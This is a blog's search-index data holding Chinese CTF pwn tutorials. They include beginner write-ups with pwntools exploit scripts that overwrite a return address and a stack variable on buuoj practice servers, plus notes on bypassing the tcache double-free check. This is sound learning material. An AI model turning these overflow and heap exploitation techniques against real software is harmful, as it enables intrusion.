{"meta":{"title":"Rin777","subtitle":"","description":"","author":"Rin777","url":"https://fuurinko.github.io","root":"/"},"pages":[{"title":"categories","date":"2014-12-22T04:39:04.000Z","updated":"2021-07-31T18:43:36.923Z","comments":true,"path":"categories/index.html","permalink":"https://fuurinko.github.io/categories/index.html","excerpt":"","text":""},{"title":"search","date":"2014-12-22T04:39:04.000Z","updated":"2021-07-31T18:46:23.612Z","comments":true,"path":"search/index.html","permalink":"https://fuurinko.github.io/search/index.html","excerpt":"","text":""},{"title":"tags","date":"2014-12-22T04:39:04.000Z","updated":"2021-07-31T18:44:04.740Z","comments":true,"path":"tags/index.html","permalink":"https://fuurinko.github.io/tags/index.html","excerpt":"","text":""},{"title":"about","date":"2021-10-22T04:28:24.000Z","updated":"2021-10-22T04:31:49.994Z","comments":true,"path":"about/index.html","permalink":"https://fuurinko.github.io/about/index.html","excerpt":"","text":"sd"}],"posts":[{"title":"SRE第一节课预习作业--linux基础预习作业","slug":"SRE第一节课预习作业--linux基础预习作业","date":"2021-10-05T13:11:05.689Z","updated":"2021-10-05T13:14:26.958Z","comments":true,"path":"2021/10/05/SRE第一节课预习作业--linux基础预习作业/","link":"","permalink":"https://fuurinko.github.io/2021/10/05/SRE%E7%AC%AC%E4%B8%80%E8%8A%82%E8%AF%BE%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A--linux%E5%9F%BA%E7%A1%80%E9%A2%84%E4%B9%A0%E4%BD%9C%E4%B8%9A/","excerpt":"","text":"SRE第一节课预习作业–linux基础预习作业Level2.1下载安装typora，并简单熟悉markdown格式的基本语法与typora先进的快捷键。 戳这里下载typora 戳这里看markdown语法 level2.2回到配置好的ubuntu，对它进行一个简单的换源。 换源参考教程 什么是软件源简单理解就是一个放着各种应用程序的仓库，类似appstore。 为什么要换源ubuntu默认的软件源服务器部署在国外，如果没有科学上网下载东西会非常慢。所以需要把软件源换成国内源。 Level2.3简单熟悉linux指令，安装vim，并使用vim写一个hello world程序，利用gcc编译并在shell中运行它。 vim使用教程 gcc编译 level3购买vps（阿里云腾讯云等等的都可以），为vps配置一个linux环境，如果不太清楚安装哪个linux发行版的话，统一安装ubuntu20.04lts，有能力的同学可以随意折腾。","categories":[],"tags":[]},{"title":"name_your_cat","slug":"2021_9_20_name_your_cat","date":"2021-09-24T12:59:11.417Z","updated":"2021-09-24T13:00:51.249Z","comments":true,"path":"2021/09/24/2021_9_20_name_your_cat/","link":"","permalink":"https://fuurinko.github.io/2021/09/24/2021_9_20_name_your_cat/","excerpt":"","text":"前言每日一题的第三题，主要是对于上一道题的一个巩固和补充，涉及到了一点函数执行流的控制，但是总体还是比较简单。 漏洞点分析在上一道题目里我们遇见了一个溢出数组变量的内存空间的漏洞，一般来说我们称这种类型漏洞为数组越界漏洞（当然，漏洞的俗名只是方便大家归类整理与交流，自己的另起说法也是可行的）。但是稍微回想一下，上一道题的关键是通过数组越界修改v2变量的值，程序设定好了，只要v2被更改为这个值，我们就能获得flag。然而在上上道，也就是nc中，我们提到过，想要做出pwn题，需要想方设法使程序执行system（‘’/bin/sh&quot;）。而那一道数据越界的题目根本没有提到system(‘’/bin/sh&quot;)，这又是怎么回事呢？难道自相矛盾了吗？实际并不是，大家如果研究一下system函数，就会知道，其实上一道题，我们之所以能拿到flag，也是因为程序执行了一个和system（&quot;/bin/sh&quot;)有一点像的system(cat flag)。为什么这两个函数参数不同，但执行的最终效果是等同的，以及这个函数的背后原理如何，可以参考文章：这些其实都是为了引出我们这一道题的解法–通过数组溢出控制程序执行流，从而调用system()函数。 用ida打开这道题，我们能够发现main函数一共只调用了两个函数，一个是init（），这个函数进行一系列初始化的操作，暂时可以忽略，然后就是一个看起来比较关键的函数vulnerable(),这个单词的意思是，易受攻击的。出题者将这个函数命名为易受攻击的函数，肯定是要给我们一些提示，解题的关键大体也在这个函数中。双击进入vulnerable()函数内部。观察一下函数的代码逻辑。 （这个lemon应该是个符号。酸的意思）为了让大家更能清楚地看懂程序的执行逻辑，我把每一行大致的功能或者意思讲清楚。 123456789101112131415161718unsigned int vulnerable()&#123; int v0; // ST20_4 signed int i; // [esp+Ch] [ebp-3Ch] char v3[40]; // [esp+14h] [ebp-34h]，定义了一个大小为0x30的字符类型数组储存猫猫的名字。 unsigned int v4; // [esp+3Ch] [ebp-Ch] v4 = __readgsdword(0x14u); //这个 __readgsdword(0x14u)是一个对于溢出的检查，大家可以简单地将它理解为read函数。 puts(&quot;I bought you five famale cats.Name for them?&quot;); for ( i = 1; i &lt;= 5; ++i ) &#123; v0 = NameWhich((int)v3);//嵌套调用的另外一个函数，用来给猫猫命名。 printf(&quot;You get %d cat!!!!!!\\nlemonlemonlemonlemonlemonlemonlemon5555555\\n&quot;, i); printf(&quot;Her name is:%s\\n\\n&quot;, &amp;v3[8 * v0]);//取出v中存的指定的字符串，看不懂的可以看看下面namewhich中的解释。 &#125; return __readgsdword(0x14u) ^ v4;//与那个溢出检查相对应，可以忽略。&#125; 然后是namewhich函数 123456789101112int __cdecl NameWhich(int a1)&#123; int v2; // [esp+18h] [ebp-10h] unsigned int v3; // [esp+1Ch] [ebp-Ch] v3 = __readgsdword(0x14u);//同理 printf(&quot;Name for which?\\n&gt;&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v2);//询问要给哪只猫命名，然后你的选择被储存在v2中，也就是v2现在是一个数字。 printf(&quot;Give your name plz: &quot;); __isoc99_scanf(&quot;%7s&quot;, 8 * v2 + a1);//，%7s代表我们最多只能用七个字符给猫猫命名，然后这里的a1就是vulnerable()中的namewhich的函数参数，也就是v3这个数组。8 * v2 + a1，大致理解就是把v3这个40大小的内存块分为五个格子，每个格子大小为8，然后通过8*格子的序列号来定位。+a1是为了找到v3内存卡的位置。 return v2;//返回v2，也就是给第v2只猫猫命名的那个v2.&#125; 大体分析完函数的代码逻辑，就来到了我们解题的第一个关键：漏洞点的分析。题目说到，买了五只小猫猫，然后请你给它们命名。for循环也规定了i最大为5，但是在NAmeWhich中，选择给第几只猫命名时的数字却没有限定。这就造成了数组溢出。我们在vulnreable函数中找到储存猫猫名字的数组的那个变量，也就是v3双击v3，进入ida中的stack窗口。这里的var_34就是v3数组开始的地址。然后重点关注一下+00000004位置的r。这个r看起来非常不起眼，但是确是我们解题的关键。从这里开始我们就要引入一个新的概念–函数的返回地址了。众所周知我们程序功能是由一个个函数实现的，一般来说程序需要有main函数，然后main函数内部再调用不同的函数。比如在这道题目中main函数调用了vulnreable函数，那么当vulnreable函数执行完成，计算机应该跳回main函数继续执行，但是计算机并不知道执行完vulnreable函数之后应该去哪里继续执行，所以这时后我们需要一个返回地址，来告诉计算机应该跳到哪里继续执行程序。关于函数返回地址实际上还有很多知识需要大家理解，但是要做出题的话，只需要知道“返回”就像一个传送门，你可以利用它跳转到几乎任意你想要跳转的地方。实际上想要彻底理解这里的秘密，需要大家学习函数调用栈，以及一些基础的汇编语言知识，这些我们留到下一周再讲，现在以感受题目为主。既然我们能够跳转到任意地址，我们是不是能把返回地址改成system（&quot;/bin/sh&quot;）的地址，让函数返回时实则是在调用system（&quot;/bin/sh&quot;）呢？在ida中，我们能够很轻易地发现，程序是包含这个后门函数的，这意味着我们可以直接引用这个函数在ida中的地址来调用它（具体的原理可以以后再学）。地址则是0x80485CB。。那么就只剩下最后一个问题了：我们怎样才能把返回地址覆盖成0x80485CB呢？还是回到stack窗口。现在再看一看，返回地址就在+04这里，而我们给猫猫命名，字符串是从-0x34开始存的，还记得之前分析到的，每一只猫猫名字最多是七个字符，并且内存空间是以8为单位划分的，从-0x34到=+04，一共有0x38，也就是56个字符。56%8 = 7从第48个字符开始，其实就已经是ret的地址了。也就是说第七只猫猫的名字，正好存在返回地址所在的地址上。所以是不是只要我们给第七只猫命的名，是我们刚刚找到的后门函数的地址，就能够提权，获得flag了？ 脚本编写怀着这样的决心，我们开始编写这道题的脚本。 12345678910from pwn import *p=remote(&quot;node4.buuoj.cn&quot;,xxxxx)shell_addr=0x80485CBp.sendlineafter(&#x27;Name for which?\\n&gt;&#x27;,&#x27;7&#x27;)p.sendlineafter(&quot;Give your name plz: &quot;,p32(shell_addr))p.interactive() 脚本的内容应该是很容易理解的，但是这里出现了一个问题。按照逻辑，我们只需给第七只猫命名为后门函数的地址，但是实际执行的时候并没有如我们所想的那样顺利。ps:如果出现了timeout: [*] Got EOF while reading in interactive 就说明交互超时，然后程序会自动退出，大概率说明你的exp存在问题（但也有很多题目是本身就存在时限）给前面几只猫猫也命上就可以了。exp： 12345678910111213141516171819from pwn import *p=remote(&quot;node4.buuoj.cn&quot;,29553)shell_addr=0x80485CBp.sendlineafter(&#x27;Name for which?\\n&gt;&#x27;,&#x27;1&#x27;)p.sendlineafter(&quot;Give your name plz: &quot;,&#x27;nya&#x27;)p.sendlineafter(&#x27;Name for which?\\n&gt;&#x27;,&#x27;2&#x27;)p.sendlineafter(&quot;Give your name plz: &quot;,&#x27;B&#x27;)p.sendlineafter(&#x27;Name for which?\\n&gt;&#x27;,&#x27;3&#x27;)p.sendlineafter(&quot;Give your name plz: &quot;,&#x27;C&#x27;)p.sendlineafter(&#x27;Name for which?\\n&gt;&#x27;,&#x27;4&#x27;)p.sendlineafter(&quot;Give your name plz: &quot;,&#x27;D&#x27;)p.sendlineafter(&#x27;Name for which?\\n&gt;&#x27;,&#x27;7&#x27;)p.sendlineafter(&quot;Give your name plz: &quot;,p32(shell_addr))p.interactive()","categories":[],"tags":[{"name":"daliy_challanges","slug":"daliy-challanges","permalink":"https://fuurinko.github.io/tags/daliy-challanges/"}]},{"title":"ciscn_2019_n_1","slug":"2021_09_15_ciscn_2019_n_1","date":"2021-09-15T13:45:54.410Z","updated":"2021-09-24T13:01:02.193Z","comments":true,"path":"2021/09/15/2021_09_15_ciscn_2019_n_1/","link":"","permalink":"https://fuurinko.github.io/2021/09/15/2021_09_15_ciscn_2019_n_1/","excerpt":"","text":"ciscn_2019_n_1前言 每日一题pwn方向的第二题。也是初入漏洞利用的一道特别基础的题。 大家都应该尝试着做过了上一道，也就是test your nc。从解法来说其实那道题的难度真的只是半脚踩在入门的门坎上。就像wp中所说的那样，目前pwn题的核心是通过漏洞挖掘与利用来提权，而nc这道题可以说是不需要任何漏洞的挖掘与利用，做出这道题并不代表你已经入门pwn了。 虽然如此，从ciscn_2019_n_1这道题开始，我们真正要开始尝试迈过pwn题的那一道门槛，面对一些简单的漏洞进行利用了。 准备工作 在做题之前，建议每一个同学在ubunut中安装pwntools。 python环境完备的基本一个pip3 install pwntools就行。如果报错的话再去搜索一下具体问题。 做题流程这里要提一个大致的流程。对于执行顺序其实并没有那么多硬性规定，只是对于萌新也许能少走一些弯路。流程大致是这样的： 拿到题目附件，将它在对应的操作系统环境下打开（一般来说是ubuntu）。先执行一下，了解一下程序的大致运行结果。 checksec命令，了解程序的保护方式。针对不同的保护方式，大致了解题目的难度等级。（萌萌新的题目应该大多是没有任何保护的，但是之后的很多题都会附加很多复杂的保护） 用ida打开题目，对题目进行一个程序逻辑的逆向。 通过逆向找到程序的漏洞点。 思考漏洞利用方式，并开始编写脚本（适当时动态调试辅助脚本编写）。 脚本编写完成后，先在本地尝试getshell。成功的话连接远程拿flag。 整个流程最关键也是最难的就是第6步。在这个wp中，我会尽可能地详细地将编写这个脚本的所有步骤和思路讲出来。其他的步骤也会进行适当的解释。 运行题目程序这也是流程中的第一步，总的来说这一步并不是必要的，但是运行一下总归能帮助大家提升对于程序逻辑的理解（尤其是逆向以及语言功底比较弱的同学）现在我们将程序放进了ubuntu系统中， 可以看到这个文件夹下的ciscn_2019_n_1文件。 这时我们会碰到今天的第一个坑。 如果我们直接./ciscn_2019_n_1, 就会出现如图的情况。 这是因为这个文件虽然可执行，但是我们并没有可执行权限。 这个情况直接利用chmod +x ciscn_2019_n_1来将文件权限改成可执行就行。 具体的原理可以搜索一下chmod指令。 通过ls -l指令目，可以看到ciscn_2019_n_1文件的权限是rwx，意味着它已经能够被执行。这时候再./ciscn_2019_n_1，程序就成功被执行了。执行的话可以看到程序要求我们猜数。（我这个颜色有点诡异，这就调一下） 可以看到连续两次程序都说，我们输入的值要为11.28125，但是我们输入了这个11.28125，程序还是没有什么让人提得起兴趣的反映。这很奇怪，待会儿让我们在ida中一探究竟（）。 checksec查保护比较简单，如果需要安装就按提示安装或者搜索安装方式就行。 程序逻辑分析用ida64打开。f5反编译出现了这样一串代码。稍微分析一下，双击func（）进入函数内我们这个程序的代码逻辑非常简单。定义了两个变量，一个是整形的v1，另外一个是浮点型v2。这里需要了解的一个知识点就是，当我们定义变量，计算机会为我们在内存中开辟一块内存空间来存储我们的变量的值。而且这个空间是连续的，开辟了v1以后再开辟v2，他们的内存块是接在一起的。如图所示。 输入数字，把数字存在v1这个内存快中，然后判断v2内存块是不是11.28125，如果是，就能拿到flag，不是就输出”Its value should be 11.28125”想要拿flag，需要使v2为11.28125.但是我们输入的变量是存在v1，似乎并没有任何方式能够改变v2的值。回想一下，刚刚我们说到v1和v2的内存空间是连续的。在ida中我们其实能够发现v1内存块的大小是0x30，那么想一想，如果我们在给v1赋值的时候，输入了比0x30还大的字符串，会发生什么呢。当字符串填满了v1的0x30的空间，由于gets函数并不会检查内控空间中发生的溢出，多出来的字符串会继续向下存入，也就是相当于越过v1内存块的界限，存进ｖ2内存块中了。这样只要我们巧妙地构造我们输入的字符串，先用0x30个任意字符将ｖ1填满，再在后面加上11.28125，是不是v2的值就变成了我们想要的？ 脚本编写我们直接略过漏洞点的寻找，开始编写脚本。我们的目标很明确，当程序要我们输入number的时候，我们给它发一大串字符串，其中前0x30个字符是任意的垃圾字符，之后是11.28125的16进制表示。这里有一个坑。就是如何正确地找到11.28125在计算机内存中的表示。 完整的脚本如下，具体每一句都会有详细的解释。 12345678910from pwn import *#导入pwntools模块，python基础知识，没有pwntools的同学可以自行搜索安装方式。#p = process(&#x27;./ciscn_n_1&#x27;)#以本地运行的方式加载程序，一般来说先是本地测试脚本，能打通再远端连接。p = remote(&#x27;node3.buuoj.cn&#x27;,27494)#以远程连接的方式加载程序。 payload = b&#x27;a&#x27;*0x2c#这两行放在外面重点讲payload += p64(0x41348000)#11.28125在内存中的十六进制表示p.send(payload)#将payload发送p.interactive()#与远端程序交互 然后着重讲一下 12payload = b&#x27;a&#x27;*0x2cpayload += p64(0x41348000) 这两句。就是构造字符串的过程，payload就是0x2c个a加上0x4134800的机器码。配合上后面的p.send(payload)，将payload发送给程序。首先需要对payload这个东西有一个大致的理解。在这之前有一个问题必须要理解。之前说到我们需要输入一大串字符串传入程序，一般的思维方式就是执行程序，然后在该输入的时候把要输入的东西输进去就行。看起来比较直观也比较简单，所以为什么要花力气用编程语言写脚本来执行这些呢？ttz您来写。我写不下去了。就大概讲一下为什么要用脚本以及如何正确理解payload。 然后回归正题，关于字符串的构造。第一句很简单，就是垃圾字符的填充。但是具体要填充多少，每道题可能都不太一样，可以通过ida查看。然后是下面那个11.28125在内存中的表示。关于如何找到11.28125的内存表示，第一种方式是直接在ida中查看，第二种方式是直接进制转化的方式，但是这个方法存在大小端序的问题，直接转化的话是大端序表示，而内存中应当是小端序，萌萌新可能会被这个点坑很久（）ida查看的话直接找到伪代码对应汇编的比较ｖ2与11.28125的那一段，找到表示11.28125的字符串，点进去（回去补图）这样我们就找了0x41348000然后我们将它填进去。可能会有同学疑惑为什么这里不是直接payload = 0x41348000或者payload = b’0x41348000’ Payload不是直接payload = b’0x41348000’是怎么回事呢？Payload相信大家都很熟悉，但是Payload不是直接payload = b’0x41348000’是怎么回事呢，下面就让小编带大家一起了解吧。 Payload不是直接payload = b’0x41348000’，其实就是我们需要输入的不是字符串，大家可能会很惊讶Payload怎么会不是直接payload = b’0x41348000’呢？但事实就是这样，小编也感到非常惊讶。 这就是关于Payload不是直接payload = b’0x41348000’的事情了，大家有什么想法呢，欢迎在评论区告诉小编一起讨论哦！（）P64(0x41348000)指将整数进行64位格式的打包，其实就是把一串人能读懂的数字转换成机器码，大概长这样 ‘/x00/x80/x34/x41’然后我们用这个脚本演示一下吧。","categories":[],"tags":[{"name":"daliy_challanges","slug":"daliy-challanges","permalink":"https://fuurinko.github.io/tags/daliy-challanges/"}]},{"title":"main_arena与多线程","slug":"main_arana 与多线程","date":"2021-08-20T01:58:00.000Z","updated":"2021-08-20T01:59:56.757Z","comments":true,"path":"2021/08/20/main_arana 与多线程/","link":"","permalink":"https://fuurinko.github.io/2021/08/20/main_arana%20%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B/","excerpt":"","text":"在学习Tcache的时候遇到了一些比较奇怪的点，ctf权威指南pwn篇中对于Tcache的解释中第一段如下： Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块，无需对main_arena上锁即可使用。 首先让我感到不解的就是，“无需对main_arena上锁即可使用”这句话。什么叫对main_arana上锁？之前也遇见过很多文章提到过这个”锁“的相关概念，但是它们从来都不是问题的重点，但是通常来说，正是一个个不懂的”无关紧要“的问题导致最后啥也看不懂的。 所以在这篇文章中我们有必要从ctf pwn的角度去理解线程 main_arena。 加锁当多个线程同时操作同一个共享全局变量的时候，对线程上锁，保证同一时间一个对象只有一个线程在访问，可以解决资源占用问题，同时保证了数据的安全性。 线程线程一般来说被进程包含：一个进程可以有很多线程来处理，每条线程并行执行不同的任务。 比如说ptmalloc2这个是个进程，然后其中包含很多很多线程。 其中会有一个main_arena,是整个ptmalloc2进程中的主线程，然后main_arena会有很多子线程，每个子线程包含很多连续的内存片段，被称为heap。每一个heap都有自己的heap_header，它们通过链表互相连接，且其中保存了指向其所属arena的指针。 这么讲似乎有一些太过抽象。具体一点讲就是，在只有一个main_arena的时候，ptmalloc只能通过mmap和sbrk申请堆内存。 在多线程的情况下，显然让所有的线程公用一个数据结构来获取内存块会造成十分惨烈的对锁的竞争，所以 ptmalloc 中间多了一层组织结构——arena。每个arena包含一些可用的内存区块，用一个 arena 级别的锁来控制访问。当线程比较少的时候，每个可以拥有自己的arena，而当 arena 数目超过允许最大值时，多个线程共享一个 arena 了。个线程第一次 malloc 的时候都会 attach 一个 arena 。除非这个 arena 被标记为破坏的（ARENA_CORRUPTION_BIT），否则该线程以后再 malloc 都会继续用这个 arena。 之前ctf权威指南中有讲到，每一个子线程包含很多连续的内存片段，被称为heap。它们都有自己所属的arena。这句话很容易让人觉得——每一个子线程有且只有一个arena，但是还存在多对一的情况。 但是对于ctf pwn来说，实际情况远远没有这么复杂，基本我们操作的所谓的堆，chunk这些概念，考点基本都是建立在单线程的情况下的，它们的arena也都是main_arena而并不是什么non_main_arena。并且只有main_arena 能够访问heap段，non_main_arena只能访问mmap映射区域。 总结用比较简单的话来说，main_arena就是主线程中一个管理所有链表的关键的数据结构，我们可以通过它获得各个bins的偏移。以及利用指向它的fd来做一些不好的事情（）。承接之前的内容，我们在利用main_arena的同时也需要对其进行上锁，防止别的线程与它共用一个资源，然后之前Tcahce里的“无需对main_arena上锁”意思也很清楚了，因为考虑到效率。所以抛弃了一定的安全性。 参考malloc x 线程 GLibcHeap","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"https://fuurinko.github.io/tags/heap/"}]},{"title":"Tcahce学习","slug":"Heap——Tcache学习","date":"2021-08-17T02:53:00.000Z","updated":"2021-08-17T01:37:54.673Z","comments":true,"path":"2021/08/17/Heap——Tcache学习/","link":"","permalink":"https://fuurinko.github.io/2021/08/17/Heap%E2%80%94%E2%80%94Tcache%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"Tcahce学习0）review说是Tcache学习，实际上是lonelywolf的复现。 网上wp都是神仙写的，一点也不萌新友好。我都看不懂（） 打开题发现这个菜单题好常规。 但是libc是2.27，难度会稍微高一点。而且这个2.27是魔改过的，加入了2.29才有的key，为Tcache加入了检查机制。 具体的参考可以看glibc2.31下的新double free手法/字节跳动pwn题gun题解。但是在这道题里面充其量算一个trick而不是核心考点。 1）漏洞点123456789101112unsigned __int64 delete()&#123; __int64 v1; // [rsp+0h] [rbp-18h] unsigned __int64 v2; // [rsp+8h] [rbp-10h] v2 = __readfsqword(0x28u); __printf_chk(1LL, &quot;Index: &quot;); __isoc99_scanf(&amp;number, &amp;v1); if ( !v1 &amp;&amp; buf ) free(buf); return __readfsqword(0x28u) ^ v2;&#125; 漏洞点。经典uaf。 之前看wp有人说edit函数里面有空字节溢出，问题大概出在++v == v1上，正确写法应该是v0++，不然判断结束但是v0多加了一次。 123456789while ( 1 ) &#123; read(0, v0, 1uLL); if ( *v0 == &#x27;\\n&#x27; ) break; if ( ++v0 == v1 ) return __readfsqword(0x28u) ^ v4; &#125; *v0 = 0; 然后有一个比较怪的点就是这里的 __readfsqword();。很明显他是一个和读取有关的函数，但是ida根本点不进去。 后面我才知道这个函数是和canary保护有关。 根据微软官方文档…这个函数的功能是【通过FS段开头的偏移来读取内存中的数据】，这里的FS段是段寄存器。定义大概是运行时被赋予功能，然后在64位win下指向运行中的os的被定义的结构，被os用来加载特定线程段内存数据。 但是好像说了和没说一样。 回到汇编语言的界面，似乎找到点不进去的原因了。具体的内容还是要码住。Canary安全机制原理实战分析 ![image-20210811161707509](/Users/rin/Library/Application Support/typora-user-images/image-20210811161707509.png) 2）漏洞利用1）Tcache double free之前也说过了，这个libc是魔改过的，增加了2.29才有的key，所以需要绕过。 虽然但是，我连普通的Tcache的题都不太清楚，正好找到一个讲得特别详细的视频，那就跟着做好了，顺便复习一下。 1234add(0,0x68)free(0)gdb.attach(p)pause() 首先先分配再释放一下，看看这个题具体的内存分布有什么特点。 1234567891011121314151617181920212223242526272829303132pwndbg&gt; heaAllocated chunk | PREV_INUSEAddr: 0x55e9c994c000Size: 0x251Free chunk (tcache) | PREV_INUSEAddr: 0x55e9c994c250Size: 0x71fd: 0x00Top chunk | PREV_INUSEAddr: 0x55e9c994c2c0Size: 0x20d41pwndbg&gt; bintcachebins0x70 [ 1]: 0x55e9c994c260 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsempty 之前一直不是很清楚 123Allocated chunk | PREV_INUSEAddr: 0x55e9c994c000Size: 0x251 这个堆块的作用，之前问学委，学委说是一些被缓存的函数啥的？？实际上是tcache的控制区域。大概就是保存Tcache chunk的一些信息。 然后这边 10x70 [ 1]: 0x55e9c994c260 ◂— 0x0 //说明0x70大小的Tcache里只有一个Tcache chunk， 12345678910pwndbg&gt; x/300gx 0x562fcfd390000x562fcfd39000: 0x0000000000000000 0x00000000000002510x562fcfd39010: 0x0000010000000000 0x00000000000000000x562fcfd39020: 0x0000000000000000 0x00000000000000000x562fcfd39030: 0x0000000000000000 0x00000000000000000x562fcfd39040: 0x0000000000000000 0x00000000000000000x562fcfd39050: 0x0000000000000000 0x00000000000000000x562fcfd39060: 0x0000000000000000 0x00000000000000000x562fcfd39070: 0x0000000000000000 0x0000562fcfd39260 这是控制堆块的部分结构 0x562fcfd39010: 0x0000010000000000 0x0000000000000000中，1说明只有一个Tcache。 T擦车堆块的首地址也记录在内。从0x562fcfd39050开始分别记录0x20到0x70的Tcache chunk的首地址，比如0x562fcfd39070: 0x0000000000000000 0x0000562fcfd39260,记录的就是0x70大小chunk的首地址。 喜闻乐见地被一个奇怪的知识点带偏了，大概就是setvbuf在pwn题中的原理。其实这个也是不陌生的一个概念了，但是一直没有深究，有机会可以写一篇文章探讨一下。 123pwndbg&gt; x/20gx 0x56533012f2500x56533012f250: 0x0000000000000000 0x00000000000000710x56533012f260: 0x0000000000000000 0x000056533012f010 我们到Tcache的地址中看一看，会发现0x56533012f260: 0x0000000000000000 0x000056533012f010处的0x000056533012f010，这是一个key值。 2.29下Tcahce double free的检测之前也说过在2.29中新增了对于Tcahce double free的检测，也就是这里的key。检测的大致思路是 对于每一个tcache中的chunk，增加了一个key指针，用于指向所属的tcache结构体(也就是修改的原本只有一行的tcache_entry) 123456typedef struct tcache_entry&#123; struct tcache_entry *next; //链表指针，对应chunk中的fd字段 /* This field exists to detect double frees. */ struct tcache_perthread_struct *key; //指向所属的tcache结构体，对应chunk中的bk字段&#125; tcache_entry; 也就是所谓的key对应的就是chunk的bk字段。 当chunk被free，放入Tcache链表时，操作如下。 123456789101112131415 static __always_inline voidtcache_put(mchunkptr chunk, size_t tc_idx)&#123; tcache_entry *e = (tcache_entry *)chunk2mem(chunk); /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will detect a double free. */ e-&gt;key = tcache; //设置所属的tcache e-&gt;next = tcache-&gt;entries[tc_idx];//单链表头插法 tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]); //计数增加&#125; 然后进行free操作 123456789101112131415161718192021222324252627size_t tc_idx = csize2tidx(size);//只要tcache不为空，并且这个chunk属于tcache管辖范围，那么这个chunk就有可能已经在tcache中了，所以需要double free检查if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)&#123; /* Check to see if it&#x27;s already in the tcache. */ tcache_entry *e = (tcache_entry *)chunk2mem(p); /* 如果是double free，那么put时key字段被设置了tcache，就会进入循环被检查出来 如果不是，那么key字段就是用户数据区域，可以视为随机的，只有1/(2^size_t)的可能行进入循环，然后循环发现并不是double free */ if (__glibc_unlikely(e-&gt;key == tcache))//剪枝 &#123; tcache_entry *tmp; LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) malloc_printerr(&quot;free(): double free detected in tcache 2&quot;); &#125; if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) //通过检查，放入tcahce中 &#123; tcache_put(p, tc_idx); return; &#125;&#125; 源码太长不看，其实就是bk位相当于一个key。如果double free了就会报错。绕过方式就是把这个bk位改成其他的东西。比较简单。所以我们可以通过edit绕过这个检测。 大致是 12345add(0,0x78)free(0)edit(0,b&quot;aaaa&quot;)free(0)show(0) 再进行接收，就能获取一个我们的堆地址。接着就能算出堆基址。 然后我们需要构造出unsortedbin chunk、 但是题目限制了分配堆块的大小，我们无法直接获得一个unsortedbin chunk。。 那么有什么办法能构造出unsortedbin呢？回到Tcache的控制堆块，并且想到我们存在的double free，我们是否能通过double free来造成Tcache的控制堆块的任意写然后来修改被控制的Tcache的信息？比如数量和地址和大小？ 如果我们把数量改成七，大小改成我们想要的其他的，然后再将其申请并释放，我们是不是就可以获得unsortedbin chukn了？ 然后可以直接通过unsortedbin中的地址来减去偏移获得libc基址，然后直接one_gadget打malloc_hook。 总体的利用思路是比较常规的，尤其是获得unsortedbin的地址之后的操作基本上就是模版化。 然后比较关键的就是前面对于Tcache 检测的绕过以及修改Tcache控制区域来构造unsorted’bin。 调试接下来是具体的调试部分，我力争把每道题都完整地调出来，只清楚原理不能实战是没有任何意义的。 但是我们首先就是要解决libc的问题。虽然我们已经找到解决问题的方法，但是中途是否会出现其他的问题这个还不得而知。 参考2021第十四届全国大学生信息安全竞赛WP（CISCN）– pwn部分 glibc2.31下的新double free手法/字节跳动pwn题gun题解 CISCN2021 lonelywolf","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"https://fuurinko.github.io/tags/heap/"}]},{"title":"ubuntu加载不同版本libc","slug":"ubuntu加载不同版本libc","date":"2021-08-17T02:53:00.000Z","updated":"2021-08-17T01:38:20.471Z","comments":true,"path":"2021/08/17/ubuntu加载不同版本libc/","link":"","permalink":"https://fuurinko.github.io/2021/08/17/ubuntu%E5%8A%A0%E8%BD%BD%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AClibc/","excerpt":"","text":"1）review 这个问题困扰了我多年，之前年轻的时候不知道为什么有的是题我就是死活调不出，后来才知道呀原来用的ubunt的版本太高了。但是我一直忽视了这个问题以为并不是什么关键的因素。我是这么认为的–只要清楚了利用方法并记住对应的libc版本，无论是不是真的把这道题调试出来了都无所谓。 然后我就是这样一步一步地变得不会调试的。 但是完整地把一道题调出来。这才是关键。这才是pwn题的灵魂。 呜呜呜，我居然一直忽略了它的灵魂 所以这一次我一定要解决掉这个问题。 之前做考核的时候，稍微研究过这个问题。但是因为下载的的libc并没有debug符号，最终还是放弃了。 目前来说针对题目的调试，一般来说是本地，远程也不用考虑这个问题。 2）原理在这之前我们需要了解一下ld以及libc在动态链接中的具体作用。实际上这也是一个比较基础的概念，ld链接器，libc共享库没什么好说的。 但是这里有一堆环境变量就很离谱。我们来依次列举一下并且搞清楚它们是做什么的。 1）LD_PRELOAD首先就是我们在脚本前加载的LD_PRELOAD这个东西。一般的用法是env=&#123;&quot;LD_PRELOAD&quot;:libc_path&#125; 它可以影响程序的运行时的链接（Runtime linker），允许你定义在程序运行前优先加载的动态链接库。 这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。 换句话说我们可以通过指定这个环境变量来指定特定的libc版本。 2）LD_LIBRARY_PATH和LIBRARY_PATHLD_LIBRARY_PATH用于在程序加载运行期间查找动态链接库时指定除了系统默认路径之外的其他路径. LIBRARY_PATH环境变量用于在程序编译期间查找动态链接库时指定查找共享库的路径 其实可以发现这三个环境变量都是修改程序需要的共享库，但是生效的时间不一样。 并且在pwn题中基本都是需要在运行前指定另外的共享库的，所以LD_PRELOAD还是比较常见。 相关（？）环境变量大概就这么多，然后是某些特殊的段。 1） PT_INTERP储存了程序使用的ld.so的路径，默认使用 /lib64/ld-linux-x86-64.so.2。 我们可以修改这个段的内容来指定我们需要的链接器。 汇总综上，我们首先要准备我们需要的libc和ld，libc可以是编译好的elf文件也可以通过源码自己编译，这个无所谓。ld文件比较诡异，似乎是一个ld能同时支持很多libc的小版本。并不是一对一的关系。 